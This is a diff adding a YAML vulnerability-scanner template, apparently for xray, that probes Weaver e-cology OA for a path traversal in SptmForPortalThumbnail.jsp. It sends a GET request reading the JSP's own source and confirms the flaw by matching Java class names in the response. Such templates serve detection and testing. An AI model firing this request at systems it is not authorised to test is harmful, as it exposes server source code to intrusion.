@@ -1,0 +1,20 @@
+name: poc-yaml-weaver-oa-sptmforportalthumbnail-jsp-path-traversal
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp
+            follow_redirects: false
+        expression: |
+            response.status == 200 && response.body.bcontains(b"weaver.general.BaseBean") && response.body.bcontains(b"getServletConfig")
+expression: r0()
+detail:
+    author: socat
+    links:
+        - http://124.223.89.192/archives/e-cology8-14
+    vulnerability:
+        id: CT-479157
+        level: high
